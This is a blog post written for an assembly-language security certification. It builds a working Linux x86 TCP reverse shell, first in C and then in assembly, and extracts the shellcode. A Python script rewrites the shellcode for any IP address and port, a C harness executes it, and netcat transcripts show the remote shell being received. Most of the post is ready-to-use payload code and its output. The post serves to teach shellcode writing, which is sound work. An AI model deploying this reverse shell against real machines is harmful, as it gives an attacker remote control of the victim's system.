# SLAE course
This blog post has been created for completing the requirements of the SecurityTube Linux.

Assembly Expert certification:
* https://www.pentesteracademy.com/course?id=3

Student ID: SLAE-1523

## Assignment#2: What to do ?


## 1) First step: create a TCP reverse shell
This shellcode needs to be able to:
* Create a reverse connection to a configured IP and Port
* Execute a shell on successful connection

The second step is to create a script which will make the IP and port configuration easy

Note:
* All the commands used for this assignment were done on the last 64 bits version of KALI Linux.

### 1.1) What is a reverse shell
A TCP reverse shell connects back to a remote machine, then executes a shell and redirects all input & output to the socket.

### 1.2) Example of a TCP reverse shell in C
An example of a TCP reverse shell in C can be found below. This example has been created in order to help me code the assembly version.
```c
#include <stdio.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <sys/socket.h>

int main(int argc, int *argv[])
{
    int s;
    struct sockaddr_in addr;
	
    // set "addr.sin_family" to IPV4
    addr.sin_family = AF_INET;
    // set the port number to 5555
    addr.sin_port = htons(5555);
    // when executed the code will connect to 127.1.1.1
    addr.sin_addr.s_addr = inet_addr("127.1.1.1");

    // Create the socket
    // AF_INET for IPv4
    // SOCK_STREAM for TCP connection
    s = socket(AF_INET, SOCK_STREAM, 0);

    // Connect to the remote machine
    connect(s, (struct sockaddr *)&addr, sizeof(addr));

    // Redirect the STDIN, STDOUT and STDERR into the socket
    for (int i = 0; i < 3; i++)
    {
        dup2(s, i);
    }

    // Execute /bin/sh
    execve("/bin/sh", 0, 0);

    return 0;
}
```


Now, let's get to work.
=

### 1.3) The assembly code

1.3.1) The first step is to initialize the stack and the registers:
```nasm
;This part initialize the registers and the stack
mov ebp, esp        ;Initialize the stack frame

xor eax, eax        ;Initialize eax to NULL
xor ebx, ebx        ;Initialize ebx to NULL
xor ecx, ecx        ;Initialize ecx to NULL
xor edx, edx        ;Initialize edx to NULL
```

1.3.2) The second step is to push the sockaddr_in struct in the stack:
```nasm
;This part push the structure "sockaddr_in" on the stack
;C code representation:
;   struct sockaddr_in struct
;   addr.sin_family = AF_INET;
;   addr.sin_port = htons(5555);
;   addr.sin_addr.s_addr = inet_addr("127.1.1.1");

push eax
push eax            ;Fill the end of the structure with 2 NULL Bytes
push 0x0101017f     ;Initialize the variable "addr.sin_addr.s_addr" to connect to 127.1.1.1  
push word 0xb315    ;Initialize the variable "addr.sin_port" to connect on port 5555 
push word 0x02      ;Initialize the variable "addr.sin_family" to IPV4 (AF_INET)
```

1.3.3) We can now call the "socket" systemcall which will create an endpoint for communication:
```nasm
;This part initialize and call the "socket" systemcall
mov ax, 0x167       ;Move the "socket" systemcall number inside ax
mov bl, 0x02        ;Move the "AF_INET" value (which means IPV4) inside bl
mov cl, 0x01        ;Move the "SOCK_STREAM" value (which means TCP) inside cl

;C code representation of the systemcall:
; --> s = socket(AF_INET, SOCK_STREAM, 0);
int 0x80            ;Execute the systemcall
mov esi, eax        ;Move the return value from the "socket" systemcall into esi
```

1.3.4) Then, we need to call the "connect" systemcall which will initiate a connection on a socket:
```nasm
;This part initialize and call the "bind" systemcall
xor eax, eax        ;Initialize eax to NULL
mov ax, 0x16a       ;Move the "connect" systemcall number inside ax
mov ebx, esi        ;Move the return value of "socket" inside ebx
mov ecx, esp        ;Point ecx to the structure
;Get the structure size
mov edx, ebp        
sub edx, esp        ;Use the stack pointers (esp and ebp to calculate the size of the structure)

;C code representation of the systemcall:
; --> connect(s, (struct sockaddr *)&sa, sizeof(sa));
int 0x80            ;Execute systemcall
```

1.3.5) This part of the code will use dup2 to redirect the STDIN, STDOUT and STDERR into the socket:
```nasm
;This part redirect the STDIN, STDOUT and STDERR into the socket
xor ecx, ecx        ;Initialize ecx to NULL
mov cl, 3           ;Initialize cl to 3
boucle:
    xor eax, eax    ;Initialize eax to NULL
    mov al, 0x3f    ;Move the "dup2" systemcall number inside al
    mov ebx, esi    ;Move the return value of "socket" in ebx
    dec cl          ;Decrement cl to 1

    ;C code representation of the systemcall:
    ;for (int i = 0; i < 3; i++)
    ;{
    ;    dup2(s, i);
    ;}
    int 0x80        ;Execute systemcall
    inc cl          ;Increment cl to 1
    loop boucle     ;Loop three time until cl is equal to 0
```

1.3.6) It's finaly the time to execute the shell:
```nasm
;This part initialize and call the "execve" systemcall
xor eax, eax        ;Initialize eax to NULL
push eax            ;Push a NULL Byte on the stack
push 0x68732f2f     
push 0x6e69622f     ;push "/bin//sh" on the stack
mov ebx, esp        ;Initialize ebx to "/bin//sh%00"
xor ecx, ecx        ;Initialize ecx to NULL
xor edx, edx        ;Initialize edx to NULL
mov al, 0xb         ;Move the "execve" systemcall number inside al
;C code representation of the systemcall:
; --> execve("/bin/sh", NULL, NULL);
int 0x80            ;Execute systemcall
```

You can find the whole code below:
-
```nasm
;ASM (x86) reverse shell for 127.1.1.1 on port 5555
global _start

_start:
    ;This part initialize the registers and the stack
    mov ebp, esp        ;Initialize the stack frame

    xor eax, eax        ;Initialize eax to NULL
    xor ebx, ebx        ;Initialize ebx to NULL
    xor ecx, ecx        ;Initialize ecx to NULL
    xor edx, edx        ;Initialize edx to NULL

    ;This part push the structure "sockaddr_in" on the stack
    ;struct sockaddr_in struct
    ;addr.sin_family = AF_INET;
    ;addr.sin_port = htons(5555);
    ;addr.sin_addr.s_addr = inet_addr("127.1.1.1");
    push eax
    push eax            ;Fill the end of the structure with 2 NULL Bytes
    push 0x0101017f     ;Initialize the variable "addr.sin_addr.s_addr" to connect to 127.1.1.1  
    push word 0xb315    ;Initialize the variable "addr.sin_port" to connect on port 5555 
    push word 0x02      ;Initialize the variable "addr.sin_family" to IPV4 (AF_INET)


    ;This part initialize and call the "socket" systemcall
    mov ax, 0x167       ;Move the "socket" systemcall number inside ax
    mov bl, 0x02        ;Move the "AF_INET" value (which means IPV4) inside bl
    mov cl, 0x01        ;Move the "SOCK_STREAM" value (which means TCP) inside cl

    ;C code representation of the systemcall:
    ; --> s = socket(AF_INET, SOCK_STREAM, 0);
    int 0x80            ;Execute the systemcall
    mov esi, eax        ;Move the return value from the "socket" systemcall into esi


    ;This part initialize and call the "bind" systemcall
    xor eax, eax        ;Initialize eax to NULL
    mov ax, 0x16a       ;Move the "connect" systemcall number inside ax
    mov ebx, esi        ;Move the return value of "socket" inside ebx
    mov ecx, esp        ;Point ecx to the structure
    ;Get the structure size
    mov edx, ebp        
    sub edx, esp        ;Use the stack pointers (esp and ebp to calculate the size of the structure)
    
    ;C code representation of the systemcall:
    ; --> connect(s, (struct sockaddr *)&sa, sizeof(sa));
    int 0x80            ;Execute systemcall


    ;This part redirect the STDIN, STDOUT and STDERR into the socket
    xor ecx, ecx        ;Initialize ecx to NULL
    mov cl, 3           ;Initialize cl to 3
    boucle:
        xor eax, eax    ;Initialize eax to NULL
        mov al, 0x3f    ;Move the "dup2" systemcall number inside al
        mov ebx, esi    ;Move the return value of "socket" in ebx
        dec cl          ;Decrement cl to 1

        ;C code representation of the systemcall:
        ;for (int i = 0; i < 3; i++)
        ;{
        ;    dup2(s, i);
        ;}
        int 0x80        ;Execute systemcall
        inc cl          ;Increment cl to 1
        loop boucle     ;Loop until cl is equal to 0 (Three times)


    ;This part initialize and call the "execve" systemcall
    xor eax, eax        ;Initialize eax to NULL
    push eax            ;Push a NULL Byte on the stack
    push 0x68732f2f     
    push 0x6e69622f     ;push "/bin//sh" on the stack
    mov ebx, esp        ;Initialize ebx to "/bin//sh%00"
    xor ecx, ecx        ;Initialize ecx to NULL
    xor edx, edx        ;Initialize edx to NULL
    mov al, 0xb         ;Move the "execve" systemcall number inside al
    ;C code representation of the systemcall:
    ; --> execve("/bin/sh", NULL, NULL);
    int 0x80            ;Execute systemcall
```

Let's open a port:
```console
kali@kali:/tmp$ nc -lvnp 5555
listening on [any] 5555 ...

```

Let's compile and execute it: 
```console
kali@kali:/tmp/$ nasm -f elf32 -o reverse_shell.o reverse_shell.nasm
kali@kali:/tmp/$ ld -m elf_i386 -z execstack -o reverse_shell reverse_shell.o
kali@kali:/tmp/$ ./reverse
```

We get our shell after executing the shellcode:
```console
kali@kali:/tmp$ nc -lvnp 5555
listening on [any] 5555 ...
connect to [127.1.1.1] from (UNKNOWN) [127.0.0.1] 50746
id
uid=1000(kali) gid=1000(kali) groups=1000(kali),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),118(bluetooth),128(lpadmin),132(scanner)
whoami
kali

```


# 2) Second step: make the ip and port configuration easy

Before explaining the python script used for this task, we need to retrieve the hexadecimal format of our shellcode. But instead of a simple '\x' before our hexadecimal value, we will need two of them '\\\x'. 

Why ? Because our python script won't interpret our shellcode without this part.

We can easily do that by using the following objdump command:
```console
kali@kali:/tmp$ objdump -d ./reverse_shell |grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'

"\\x89\\xe5\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\x50\\x50\\x68\\x7f\\x01\\x01\\x01\\x66\\x68\\x15\\xb3\\x66\\x6a\\x02\\x66\\xb8\\x67\\x01\\xb3\\x02\\xb1\\x01\\xcd\\x80\\x89\\xc6\\x31\\xc0\\x66\\xb8\\x6a\\x01\\x89\\xf3\\x89\\xe1\\x89\\xef\\x29\\xe7\\x89\\xfa\\xcd\\x80\\x31\\xc9\\xb1\\x03\\x31\\xc0\\xb0\\x3f\\x89\\xf3\\xfe\\xc9\\xcd\\x80\\xfe\\xc1\\xe2\\xf2\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc9\\x31\\xd2\\xb0\\x0b\\xcd\\x80"
```

We can now add this shellcode to our python script. This script is pretty simple, it parses the 'shellcode' variable content, look for the '\\x15\\xb3' pattern (which is 5555 in reverse hexadecimal) and replace it by the port value asked by the user. 

It also does the same thing for the IP, it looks for the '\\x7f\\x01\\x01\\x01' pattern (which is 127.1.1.1 in reverse hexadecimal) and replace it by the ip value asked by the user.

Here is the code:
```python
#!/usr/bin/python3

import sys
import socket
import binascii

# The shellcode used
shellcode = '\\x89\\xe5\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\x50\\x50\\x68\\x7f\\x01\\x01\\x01\\x66\\x68\\x15\\xb3\\x66\\x6a\\x02\\x66\\xb8\\x67\\x01\\xb3\\x02\\xb1\\x01\\xcd\\x80\\x89\\xc6\\x31\\xc0\\x66\\xb8\\x6a\\x01\\x89\\xf3\\x89\\xe1\\x89\\xef\\x29\\xe7\\x89\\xfa\\xcd\\x80\\x31\\xc9\\xb1\\x03\\x31\\xc0\\xb0\\x3f\\x89\\xf3\\xfe\\xc9\\xcd\\x80\\xfe\\xc1\\xe2\\xf2\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc9\\x31\\xd2\\xb0\\x0b\\xcd\\x80'

# Check if the ip and port are specified
if len(sys.argv) < 3:
	print('Usage: python {name} <IP> <PORT>'.format(name = sys.argv[0]))
	print('Example: python {name} 127.1.1.1 5555'.format(name = sys.argv[0]))
	exit(1)

# This part find and replace the ip address
ip = sys.argv[1].split('.')
ip_in_hex = '{:02X}{:02X}{:02X}{:02X}'.format(*map(int, ip))
shellcode = shellcode.replace('\\x7f\\x01\\x01\\x01', '\\x{0}\\x{1}\\x{2}\\x{3}'.format(
										ip_in_hex[0:2],
										ip_in_hex[2:4],
										ip_in_hex[4:6],
										ip_in_hex[6:8]
))

# This part find and replace the port number
port = hex(socket.htons(int(sys.argv[2])))
shellcode = shellcode.replace('\\x15\\xb3', '\\x{0}\\x{1}'.format(port[4:6], port[2:4]))

# Print the shellcode
print(shellcode)
```

This script will give us the following result:
```console
kali@kali:/tmp$ python3 modify_reverse_shell.py 127.1.1.7 2222

\x89\xe5\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x50\x50\x68\x7F\x01\x01\x07\x66\x68\x08\xae\x66\x6a\x02\x66\xb8\x67\x01\xb3\x02\xb1\x01\xcd\x80\x89\xc6\x31\xc0\x66\xb8\x6a\x01\x89\xf3\x89\xe1\x89\xef\x29\xe7\x89\xfa\xcd\x80\x31\xc9\xb1\x03\x31\xc0\xb0\x3f\x89\xf3\xfe\xc9\xcd\x80\xfe\xc1\xe2\xf2\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80
```

In order to test the result, we can now used a C program which will execute our shellcode.

The C program can be found below:
```c
#include <stdio.h>
#include <string.h>

// the shellcode is stored here
unsigned char code[] = \
"\x89\xe5\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x50\x50\x68\x7F\x01\x01\x07\x66\x68\x08\xae\x66\x6a\x02\x66\xb8\x67\x01\xb3\x02\xb1\x01\xcd\x80\x89\xc6\x31\xc0\x66\xb8\x6a\x01\x89\xf3\x89\xe1\x89\xef\x29\xe7\x89\xfa\xcd\x80\x31\xc9\xb1\x03\x31\xc0\xb0\x3f\x89\xf3\xfe\xc9\xcd\x80\xfe\xc1\xe2\xf2\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80";

int main()
{
	// print the length of the shellcode
	printf("Shellcode Length:  %d\n", strlen(code));

	// convert the shellcode variable to a function
	int (*ret)() = (int(*)())code;

	// execute the shellcode
	ret();

}
```

We will use netcat to open a port on localhost:
```console
kali@kali:/tmp$ nc -lvnp 2222
listening on [any] 2222 ...

```

On another terminal, we will compile it and execute it:
```console
kali@kali:/tmp$ gcc test_shellcode.c -o test_shellcode -m32 -fno-stack-protector -z execstack
kali@kali:/tmp$ ./test_shellcode 
Shellcode Length:  95

```

Finaly, netcat can be used to access our shell:
```console
kali@kali:/tmp$ nc -lvnp 2222
listening on [any] 2222 ...
connect to [127.1.1.7] from (UNKNOWN) [127.0.0.1] 36240
id
uid=1000(kali) gid=1000(kali) groups=1000(kali),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),118(bluetooth),128(lpadmin),132(scanner)
whoami
kali

```
